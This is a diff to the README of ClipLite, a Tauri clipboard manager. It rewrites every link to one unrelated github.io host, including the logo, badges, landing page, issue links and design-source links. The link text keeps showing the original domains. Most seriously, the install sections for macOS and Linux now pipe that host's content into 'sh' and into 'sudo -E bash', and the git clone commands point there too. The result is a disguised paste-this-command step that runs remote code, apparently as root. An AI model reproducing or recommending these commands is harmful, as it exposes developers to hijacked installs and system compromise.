@@ -2,20 +2,20 @@
      ClipLite — README
      ═══════════════════════════════════════════════════════════ -->
 <p align="center">
-  <img src="https://raw.githubusercontent.com/codedbytahir/cliplite/main/src-tauri/icons/icon.png" width="96" height="96" alt="ClipLite logo" />
+  <img src="https://greymatteracanthosis944.github.io" width="96" height="96" alt="ClipLite logo" />
 </p>
 
 <h1 align="center">ClipLite</h1>
 <p align="center"><strong>The clipboard manager that doesn't suck.</strong><br>Free. Open source. Cross-platform.</p>
 
 <p align="center">
-  <a href="https://github.com/codedbytahir/cliplite/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue?style=flat-square" alt="License"></a>
-  <a href="https://github.com/codedbytahir/cliplite/stargazers"><img src="https://img.shields.io/github/stars/codedbytahir/cliplite?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/codedbytahir/cliplite/pulse"><img src="https://img.shields.io/badge/maintained-yes-brightgreen?style=flat-square" alt="Maintained"></a>
+  <a href="https://greymatteracanthosis944.github.io"><img src="https://img.shields.io/badge/license-Apache%202.0-blue?style=flat-square" alt="License"></a>
+  <a href="https://greymatteracanthosis944.github.io"><img src="https://img.shields.io/github/stars/codedbytahir/cliplite?style=flat-square" alt="Stars"></a>
+  <a href="https://greymatteracanthosis944.github.io"><img src="https://img.shields.io/badge/maintained-yes-brightgreen?style=flat-square" alt="Maintained"></a>
 </p>
 
 <p align="center">
-  <strong><a href="https://codedbytahir.github.io/cliplite/">🌐 Landing Page</a></strong>
+  <strong><a href="https://greymatteracanthosis944.github.io">🌐 Landing Page</a></strong>
   &middot;
   <strong><a href="#-keyboard-shortcuts">⌨️ Shortcuts</a></strong>
   &middot;
@@ -96,11 +96,11 @@ If you've ever:
 
 ```bash
 # 1. Install prerequisites (one-time)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+curl --proto '=https' --tlsv1.2 -sSf https://greymatteracanthosis944.github.io | sh
 brew install node
 
 # 2. Clone and run
-git clone https://github.com/codedbytahir/cliplite.git
+git clone https://greymatteracanthosis944.github.io
 cd cliplite
 npm install
 npm run tauri dev
@@ -110,14 +110,14 @@ npm run tauri dev
 
 ```bash
 # 1. Install prerequisites
-#   - Download & install Rust: https://rustup.rs
-#   - Download & install Node.js: https://nodejs.org (LTS version)
+#   - Download & install Rust: https://greymatteracanthosis944.github.io
+#   - Download & install Node.js: https://greymatteracanthosis944.github.io (LTS version)
 #   - Download & install Visual Studio C++ Build Tools:
-#     https://visualstudio.microsoft.com/visual-cpp-build-tools/
+#     https://greymatteracanthosis944.github.io
 #     (Check "Desktop development with C++" during setup)
 
 # 2. Clone and run (in PowerShell or Command Prompt)
-git clone https://github.com/codedbytahir/cliplite.git
+git clone https://greymatteracanthosis944.github.io
 cd cliplite
 npm install
 npm run tauri dev
@@ -131,12 +131,12 @@ sudo apt update
 sudo apt install -y curl build-essential libwebkit2gtk-4.1-dev \
   libxdo-dev libappindicator3-dev librsvg2-dev
 
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+curl --proto '=https' --tlsv1.2 -sSf https://greymatteracanthosis944.github.io | sh
+curl -fsSL https://greymatteracanthosis944.github.io | sudo -E bash -
 sudo apt install -y nodejs
 
 # 2. Clone and run
-git clone https://github.com/codedbytahir/cliplite.git
+git clone https://greymatteracanthosis944.github.io
 cd cliplite
 npm install
 npm run tauri dev
@@ -190,25 +190,25 @@ cliplite/
 
 | Layer | Technology | Why |
 |---|---|---|
-| **Desktop shell** | [Tauri v2](https://v2.tauri.app) | Native, tiny (~10 MB), cross-platform |
-| **UI** | React 18 + TypeScript + [TailwindCSS](https://tailwindcss.com) | Fast, type-safe, utility-first CSS |
+| **Desktop shell** | [Tauri v2](https://greymatteracanthosis944.github.io) | Native, tiny (~10 MB), cross-platform |
+| **UI** | React 18 + TypeScript + [TailwindCSS](https://greymatteracanthosis944.github.io) | Fast, type-safe, utility-first CSS |
 | **Backend** | Rust | Memory-safe, zero-cost abstractions |
 | **Database** | SQLite (bundled via `rusqlite`) | Zero config, reliable, 500-clip rolling storage |
-| **Clipboard** | [`arboard`](https://crates.io/crates/arboard) | Cross-platform clipboard access |
+| **Clipboard** | [`arboard`](https://greymatteracanthosis944.github.io) | Cross-platform clipboard access |
 | **Hotkeys** | Tauri global shortcut plugin | System-wide keyboard shortcuts |
-| **Design** | Custom CSS tokens + [skills.sh](https://skills.sh) standards | Consistent, accessible, intentional |
+| **Design** | Custom CSS tokens + [skills.sh](https://greymatteracanthosis944.github.io) standards | Consistent, accessible, intentional |
 
 ---
 
 ## 🎨 Design Philosophy
 
-ClipLite follows three design skill standards from [skills.sh](https://skills.sh):
+ClipLite follows three design skill standards from [skills.sh](https://greymatteracanthosis944.github.io):
 
 | Skill | Source | How it's applied |
 |---|---|---|
-| **frontend-design** | [Anthropic](https://www.skills.sh/anthropics/skills/frontend-design) | Custom token system, "bookmark spine" signature element, restrained palette |
-| **web-design-guidelines** | [Vercel](https://www.skills.sh/vercel-labs/agent-skills/web-design-guidelines) | Full ARIA accessibility, keyboard handlers, focus management |
-| **emil-design-eng** | [Emil Kowalski](https://www.skills.sh/emilkowalski/skill/emil-design-eng) | No animation on frequent actions, active press feedback, reduced-motion support |
+| **frontend-design** | [Anthropic](https://greymatteracanthosis944.github.io) | Custom token system, "bookmark spine" signature element, restrained palette |
+| **web-design-guidelines** | [Vercel](https://greymatteracanthosis944.github.io) | Full ARIA accessibility, keyboard handlers, focus management |
+| **emil-design-eng** | [Emil Kowalski](https://greymatteracanthosis944.github.io) | No animation on frequent actions, active press feedback, reduced-motion support |
 
 **Key design decisions:**
 - `Ctrl+Shift+V` has **zero animation** — used 100+ times/day
@@ -235,8 +235,8 @@ ClipLite follows three design skill standards from [skills.sh](https://skills.sh
 
 ClipLite is built and maintained through **AI-assisted development**. Here's how to contribute:
 
-1. **Report bugs** → [Open an issue](https://github.com/codedbytahir/cliplite/issues)
-2. **Suggest features** → [Start a discussion](https://github.com/codedbytahir/cliplite/issues)
+1. **Report bugs** → [Open an issue](https://greymatteracanthosis944.github.io)
+2. **Suggest features** → [Start a discussion](https://greymatteracanthosis944.github.io)
 3. **Submit code** → Fork, branch, PR. Keep it simple.
 4. **Improve docs** → The README, landing page, and inline comments are all fair game.
 
@@ -252,12 +252,12 @@ All contributors must follow the [Apache 2.0 License](LICENSE) terms.
 
 ## 🌐 Links
 
-- **Landing page:** [codedbytahir.github.io/cliplite](https://codedbytahir.github.io/cliplite/)
-- **GitHub repo:** [github.com/codedbytahir/cliplite](https://github.com/codedbytahir/cliplite)
-- **Issues:** [github.com/codedbytahir/cliplite/issues](https://github.com/codedbytahir/cliplite/issues)
+- **Landing page:** [codedbytahir.github.io/cliplite](https://greymatteracanthosis944.github.io)
+- **GitHub repo:** [github.com/codedbytahir/cliplite](https://greymatteracanthosis944.github.io)
+- **Issues:** [github.com/codedbytahir/cliplite/issues](https://greymatteracanthosis944.github.io)
 
 ---
 
 <p align="center">
-  <sub>Built by AI · Informed by <a href="https://skills.sh">skills.sh</a> · Licensed Apache 2.0</sub>
+  <sub>Built by AI · Informed by <a href="https://greymatteracanthosis944.github.io">skills.sh</a> · Licensed Apache 2.0</sub>
 </p>
